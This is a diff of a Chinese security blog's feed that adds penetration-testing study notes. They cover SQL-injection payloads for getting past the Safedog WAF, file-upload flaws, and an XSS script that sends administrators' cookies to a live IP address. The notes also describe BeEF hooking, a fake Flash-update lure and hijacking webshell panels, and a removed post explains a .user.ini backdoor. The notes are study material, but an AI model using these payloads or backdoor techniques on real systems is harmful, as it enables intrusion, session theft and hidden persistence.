+				}
+				for data in open(&quot;php.txt&quot;):
+					data = data.replace('\n','')
+					urls=url+data
+					code=requests.get(urls,headers=head).status_code
+					print(urls+'|'+str(code))    
+</code></pre>
+<h1 id="2021-10-09">2021-10-09</h1>
+<h1 id="sql注入之sqlmap绕过waf">SQL注入之SQLMAP绕过WAF</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633745600331.png" alt="" loading="lazy"><br>
+<strong>方式一：IP白名单</strong><br>
+通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。<br>
+从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。<br>
+测试方法：修改http的header来by pass waf<br>
+X-forwarded-for<br>
+X-remote-IP<br>
+X-remote-addr<br>
+X-Real-IP</p>
+<p><strong>方式二：静态资源</strong><br>
+特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。<br>
+http://10.9.9.201/sql.php?id=1<br>
+http://10.9.9.201/sql.php/1.js?id=1<br>
+备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633745608077.png" alt="" loading="lazy"><br>
+<strong>方式三：url白名单</strong><br>
+为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：<br>
+http://10.9.9.201/sql.php/admin/php?id=1<br>
+http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd<br>
+http://10.9.9.201/../../../manage/../sql.asp?id=2<br>
+waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&amp;b=../etc/passwd绕过防御规则。</p>
+<p><strong>方式四：爬虫白名单</strong><br>
+部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>
+1.根据UserAgent<br>
+2.通过行为来判断<br>
+UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。<br>
+User Agent Switcher (firefox 附加组件)，下载地址：<br>
+https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/<br>
+伪造成百度爬虫<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633745612766.png" alt="" loading="lazy"><br>
+知识点<br>
+市面上常见的 waf 产品列表分析-wafw00f<br>
+​ 阿里云盾，安全狗，宝塔</p>
+<p>部分 bypass sqlinject payload<br>
+原理：</p>
+<pre><code>?id= 1 union %23a%0A select 1,2,3 
+</code></pre>
+<p>其实是<br>
+union #a                         //写#闭合a，%0A换行让union select执行<br>
+select 1,2,3</p>
+<p>安全狗匹配到union接着注释，安全狗认为句子结束<br>
+为防止安全狗继续读取下去，<strong>加上a来干扰</strong>，从而达到了绕过思路<br>
+<strong>union a select 狗子不会拦截</strong></p>
+<pre><code>id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23
+
+id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23
+
+id=-1%20union%20/*!44509select*/%201,2,3%23
+
+id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23id=1/**&amp;id=-1%20union%20select%201,2,3%23*/
+
+id=-1 %20union%20all%23%0a%20select%201,2,3%23
+
+-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
+
+id=-1 union /*//--/*/     /*!--+/*%0aselect/*!1,2,3*/  --+
+</code></pre>
+<p>Http参数污染（https://www.cnblogs.com/xishaonian/p/6209441.html）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633745725334.png" alt="" loading="lazy"><br>
+参数污染举例及原理：</p>
+<pre><code>?id=1/**&amp;id=-1 union select 1,2,3 #*/ 
+</code></pre>
+<p>安全狗接受的</p>
+<pre><code>1/**&amp;id=-1 union select 1,2,3 #*/        
+</code></pre>
+<p>网站接受的（apache中get污染特性https://blog.csdn.net/weixin_43872099/article/details/104926292）</p>
+<pre><code>-1 union select 1,2,3 #*/       执行的语句  
+</code></pre>
+<p>apche接受的是上面这个语句，#将后面的都注释掉了<br>
+安全狗接受的语句中有注释符号，起到注释作用，正常情况没法执行，安全狗直接忽略。</p>
+<p>主要是利用参数污染来导致网站和安全狗接受数据的不一致性，实现绕过的操作</p>
+<pre><code>id=1%23a%&amp;id=-1%20union%20select%201,2,3%23
+</code></pre>
+<p>演示案例<br>
+WAF 部署-安全狗,宝塔等 waf 搭建部署</p>
+<p>简要讲解安全狗,宝塔等防护 waf 策略规则</p>
+<p>简要演示安全狗 bypass sqlinject 防护规则（以sqli-labs/Less-2为例子）</p>
+<p>在安全狗开启的情况下，我们对其进行注入，发现被拦截<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746157483.png" alt="" loading="lazy"></p>
+<p>在这里，我们尝试改变提交方式。尝试用Post方法进行，发现没被拦截，但网页显示不正常，我们可以知道网站不允许进行post方式传值<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746161744.png" alt="" loading="lazy"></p>
+<p>我们对源代码进行修改，将提交数据方式改为request方式，让它也能够通过post接受数据，发现能够可以正常注入<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746174743.png" alt="" loading="lazy"></p>
+<p>​ 这种情况说明提交方式绕过WAF，前提是网站支持各种方式的接受（如request），我们利用post和get都可以提交，get有防护但是post没有防护的话，我们可以转化提交方式进行注入操作</p>
+<p>接着进行注入操作，发现当我们查询数据库名的时候，又被拦截了，说明安全狗拦截不仅是一方面而已<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746179034.png" alt="" loading="lazy"></p>
+<p>通过查询安全狗的防护措施，我们可以发现有对应的规则进行防护<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746182574.png" alt="" loading="lazy"></p>
+<p>这时候我们发现即使更改提交方式还是被拦截，接下来我们就要对数据进行处理，对数据进行变异操作后再进行注入，我们尝试使用特殊符号（其中之一）对数据进行处理</p>
+<p>绕过的关键点:绕过匹配规则，同时不干扰语句的正常执行</p>
+<p>我们将database（）改成<code>database/**/()</code>，你会发现我们绕过了，成功获取到数据库名<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746189211.png" alt="" loading="lazy"></p>
+<p>我们对源代码再进行修改，将提交数据方式改回get方式，需要注意到的是安全狗中get方式拦截规则更多，用相同的语句进行注入，被拦截了（查询拦截规则＋自己验证知道，union select联合查询这个点触发规则被拦截了）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746193968.png" alt="" loading="lazy"></p>
+<p>绕过思路主要是让union和select这个不在一起即可，那我们进行特殊符号进行干扰<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746200351.png" alt="" loading="lazy"></p>
+<p>实测简易 CMS 头部注入漏洞 Bypass 原理分析</p>
+<p>利用安全狗没有检测http头部进行绕过操作（2020年安全狗）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633746204473.png" alt="" loading="lazy"><br>
+涉及资源<br>
+https://www.cnblogs.com/backlion/p/9721687.html</p>
+<p>https://blog.csdn.net/nzjdsds/article/details/93740686</p>
+<p>#应用层</p>
+<p>大小写/关键字替换<br>
+id=1 UnIoN/**/SeLeCT 1,user()<br>
+Hex() bin() 等价于 ascii()<br>
+Sleep() 等价于 benchmark()<br>
+Mid()substring() 等价于 substr()<br>
+@@user 等价于 User()<br>
+@@Version 等价于 version()</p>
+<p>各种编码<br>
+大小写，URL，hex，%0A 等</p>
+<p>注释使用</p>
+<pre><code>// -- --+ # /**/ + :%00 /!**/等
+</code></pre>
+<p>再次循环<br>
+union==uunionnion</p>
+<p>等价替换<br>
+user()=@@user() and=&amp; or=| ascii=hex 等</p>
+<p>参数污染<br>
+?id=1&amp;id=2&amp;id=3</p>
+<p>编码解码及加密解密<br>
+s-&gt;%73-&gt;%25%37%33<br>
+hex,unlcode,base64 等</p>
+<p>更改请求提交方式<br>
+GET POST COOKIE 等<br>
+POST-&gt;multipart/form-data</p>
+<p>中间件 HPP 参数污染</p>
+<p>#数据库特性</p>
+<p>1、Mysql 技巧<br>
+（1）mysql 注释符有三种：<br>
+#、/<em>...</em>/、-- ... (注意--后面有一个空格)<br>
+（2）空格符</p>
+<pre><code>:[0x09,0x0a-0x0d,0x20,0xa0]
+</code></pre>
+<p>（3）特殊符号：%a 换行符</p>
+<pre><code>可结合注释符使用%23%0a，%2d%2d%0a。 
+</code></pre>
+<p>（4）内联注释：</p>
+<pre><code>/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540
+</code></pre>
+<p>（5）mysql 黑魔法</p>
+<pre><code>select{x username}from {x11 test.admin};
+</code></pre>
+<p>2、SQL Server 技巧</p>
+<pre><code>（1）用来注释掉注射后查询的其余部分：
+/* C 语言风格注释
+\-- SQL 注释
+; 00％ 空字节
+（2）空白符：[0x01-0x20]
+（3）特殊符号：%3a 冒号
+id=1 union:select 1,2 from:admin
+（4）函数变形：如 db_name[空白字符]()
+</code></pre>
+<p>3、Oracle 技巧</p>
+<pre><code>（1）注释符：--、/**/
+（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]
+</code></pre>
+<p>4.配合 FUZZ<br>
+select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45889197/article/details/119956015</p>
+<h1 id="2021-10-10">2021-10-10</h1>
+<p>#文件上传之基础及过滤方式</p>
+<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1633827971553.png" alt="" loading="lazy"></figure>
+<p><strong>什么是文件上传漏洞？</strong><br>
+凡是存在文件上传的地方它均有可能存在文件上传漏洞，关于上传文件操作的时候对方代码写的是否完整、是否安全，一旦疏忽了某个地方可能会造成文件上传漏洞。</p>
+<p><strong>文件上传漏洞由哪些危害？</strong><br>
+文件可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。</p>
+<p><strong>文件上传漏洞如何查找及判断？</strong><br>
+1.黑盒查找。文件后台、会员中心、文件扫描。<br>
+2.白盒查找。通过代码分析到上传漏洞、查找文件上传功能。</p>
+<p><strong>文件上传漏洞有哪些需要注意的地方？</strong><br>
+对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。</p>
+<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1633827978130.png" alt="" loading="lazy"></figure>
+<p>演示案例<br>
+常规文件上传地址的获取说明</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633827983855.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633827988815.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633827992708.png" alt="" loading="lazy"></p>
+<p>不同格式下的文件类型后门测试</p>
+<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1633827998391.png" alt="" loading="lazy"></figure>
+<p>不要妄想通过一个图片你能带着你的后门来控制网站。什么格式代码就用什么格式去执行。</p>
+<figure data-type="image" tabindex="22"><img src="https://jinqipiaopiao.github.io//post-images/1633828020026.png" alt="" loading="lazy"></figure>
+<p>配合解析漏洞下的文件类型后门测试</p>
+<pre><code>nginx解析漏洞 https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://jinqipiaopiao.github.io//post-images/1633828031381.png" alt="" loading="lazy"></figure>
+<p>解析漏洞：对方在解析上的混乱</p>
+<figure data-type="image" tabindex="24"><img src="https://jinqipiaopiao.github.io//post-images/1633828037364.png" alt="" loading="lazy"></figure>
+<p>本地文件上传漏洞靶场环境搭建测试</p>
+<pre><code>https://github.com/c0ny1/upload-labs
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://jinqipiaopiao.github.io//post-images/1633828183368.png" alt="" loading="lazy"></figure>
+<p>HP称为后端语言是因为它的代码和你前端执行源代码是不同的。<br>
+前端：代码直接在浏览器上执行。(不安全)<br>
+后端：发送到对方服务器脚本里面，脚本在去验证去判断。<br>
+前端代码过滤，删除这段代码</p>
+<figure data-type="image" tabindex="26"><img src="https://jinqipiaopiao.github.io//post-images/1633828188369.png" alt="" loading="lazy"></figure>
+<p>某CMS及CVE编号文件上传漏洞测试<br>
+上传操作是用JS提交，在浏览器前端完成，所以抓不到包</p>
+<figure data-type="image" tabindex="27"><img src="https://jinqipiaopiao.github.io//post-images/1633828192637.png" alt="" loading="lazy"></figure>
+<p>改成PHP</p>
+<figure data-type="image" tabindex="28"><img src="https://jinqipiaopiao.github.io//post-images/1633828197646.png" alt="" loading="lazy"></figure>
+<p>修改uid为3</p>
+<figure data-type="image" tabindex="29"><img src="https://jinqipiaopiao.github.io//post-images/1633828201901.png" alt="" loading="lazy"></figure>
+<h1 id="2021-10-12">2021-10-12</h1>
+<h1 id="订单cookie窃取和shell箱子反杀">订单cookie窃取和shell箱子反杀</h1>
+<p><strong>通过提交订单的方式植入xss来获取网站管理员cookie</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634040985645.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634040989749.png" alt="" loading="lazy"></p>
+<p><strong>简单测试</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634040993232.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634040996922.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041001569.png" alt="" loading="lazy"></p>
+<p><strong>窃取cookie</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041005682.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041010292.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041016364.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041020276.png" alt="" loading="lazy"></p>
+<p>https://www.postman.com/downloads/下载postman<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041025740.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041029543.png" alt="" loading="lazy"></p>
+<p>本地构造实现xss攻击1<br>
+本地服务器端39.96.44.170 文件jieshou.php<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041038244.png" alt="" loading="lazy"></p>
+<pre><code>&lt;script&gt;
+new Image().src =
+&quot;http://39.96.44.170/jieshou.php?c=&quot; + encodeURI(document.cookie);
+&lt;/script&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634041043950.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041048482.png" alt="" loading="lazy"></p>
+<p>方法2<br>
+<strong>本地加载js脚本</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041053351.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041059246.png" alt="" loading="lazy"></p>
+<p><strong>webshell沙箱反杀</strong><br>
+就是使用别人的webshell来进行获取服务器shell，但获取shell后webshell存在的恶意代码就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行信息收集，通过大量获取的网站shell来进行贩卖，而使用webshell的人就成打工仔了<br>
+反杀的意思就是像上面的窃取cookie道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到反客为主！<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041064099.png" alt="" loading="lazy"></p>
+<p>webshell 中的恶意代码<br>
+把网站信息发送到指定地址<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041070329.png" alt="" loading="lazy"></p>
+<p><strong>成功发送到沙箱</strong></p>
+<p><strong>反杀操作</strong><br>
+webshell中的恶意代码</p>
+<figure data-type="image" tabindex="30"><img src="https://jinqipiaopiao.github.io//post-images/1634041075367.png" alt="" loading="lazy"></figure>
+<p><strong>通过访问webshll来植入xss代码窃取cookie</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041081896.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041089713.png" alt="" loading="lazy"></p>
+<p><strong>殊不知cooKie已被窃取</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041095673.png" alt="" loading="lazy"></p>
+<p><strong>登录沙箱后台</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041100850.png" alt="" loading="lazy"></p>
+<p><strong>演示存在后门的大马</strong><br>
+通过打开webshell进行抓包测试发现向恶意网站发送信息<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041105669.png" alt="" loading="lazy"></p>
+<p><strong>发送的代码</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041111745.png" alt="" loading="lazy"></p>
+<p><strong>内容为网站地址和webshell密码</strong></p>
+<p><strong>beef结合xss攻击</strong><br>
+启动beef<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041118387.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041125054.png" alt="" loading="lazy"></p>
+<p><strong>后台管理员查看订单触发xss</strong><br>
+成功上线<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041132976.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041142548.png" alt="" loading="lazy"></p>
+<p><strong>社工攻击(利用flash更新)</strong><br>
+利用模拟flash更新向客户端发送请求，来实现下载后门<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041148881.png" alt="" loading="lazy"><br>
+客户端显示<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041152952.png" alt="" loading="lazy"></p>
+<p><strong>点击就下载后门</strong><br>
+<strong>获取session思路</strong><br>
+<strong>因为当访问php探针时就会携带session</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041157643.png" alt="" loading="lazy"></p>
+<p>如果能利用xss让管理员页面跳转到phpinfo()页面，通过返回页面源码就能窃取session</p>
+<p><strong>利用beef进行页面跳转</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041164166.png" alt="" loading="lazy"></p>
+<p><strong>获取页面源码</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041175723.png" alt="" loading="lazy"></p>
+<p><strong>获取源码中的cookie和session</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634041179842.png" alt="" loading="lazy"></p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「是偉臦道长啊」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_54252904/article/details/117134382</p>
 ]]></content>
     </entry>
     <entry>
@@ -7116,66 +7788,6 @@ WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命
 <img src="https://jinqipiaopiao.github.io//post-images/1623834380453.png" alt="" loading="lazy"><br>
 file() 函数把整个文件读入一个数组中。<br>
 与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[.user.ini文件构成的PHP后门]]></title>
-        <id>https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/</id>
-        <link href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">
-        </link>
-        <updated>2021-05-27T00:05:12.000Z</updated>
-        <content type="html"><![CDATA[<p>.user.ini。他比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi与逆行的php都可以用这个方法。我的nginx服务器全部都是fpm/fastcgi，我的IIS php5.3以上的全部用的是fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性</p>
-<p>那么什么是.user.ini?<br>
-这得从php.ini说起了，php.ini是php默认的配置文件，其中包括了很多php的配置，则这些配置中，又分为几种:PHP_INI_SYSTEM,PHP_INI_PERDIR,PHP_INI_ALL,PHP_INI_USER<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075227664.png" alt="" loading="lazy"><br>
-其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了：</p>
-<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
-<p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
-<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
-<p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p>
-<p>Php配置项中有两个比较有意思的项（下图第一、四个）：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075273188.png" alt="" loading="lazy"><br>
-auto_append_file、auto_prepend_file，点开看看什么意思：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075289853.png" alt="" loading="lazy"></p>
-<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br>
-auto_prepend_file=01.gif</p>
-<p>01.gif是要包含的文件。</p>
-<p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
-<p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075364785.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075368008.png" alt="" loading="lazy"><br>
-访问echo.php即可看到后门：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075388506.png" alt="" loading="lazy"><br>
-Nginx下同样：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075413515.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622075417233.png" alt="" loading="lazy"><br>
-那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
-<p>参考文献：</p>
-<p>https://www.cnblogs.com/qianxiao996/p/13574589.html<br>
-http://php.net/manual/zh/ini.list.php<br>
-http://php.net/manual/zh/configuration.changes.modes.php<br>
-http://php.net/manual/zh/configuration.file.per-user.php<br>
-http://php.net/manual/zh/configuration.changes.php</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[应用层协议]]></title>
-        <id>https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/</id>
-        <link href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">
-        </link>
-        <updated>2021-05-26T12:28:29.000Z</updated>
-        <content type="html"><![CDATA[<p>TCP<br>
-FTP：定义了文件传输协议，使用21端口<br>
-Telnet：他是一种用于远程登录的端口，23端口<br>
-SMTP：定义了简单邮件传送协议，服务器开放的是25端口<br>
-POP3：他适合SMTP对应，POP3用于接收邮件<br>
-HTTP<br>
-UDP对应的应用层协议<br>
-DNS：用于域名解析服务，用的是53端口<br>
-SNMP：简单网络管理协议，用的是161端口<br>
-TFTP（Trival File Transfer Protocal）：简单文件传输协议，69</p>
 ]]></content>
     </entry>
 </feed>
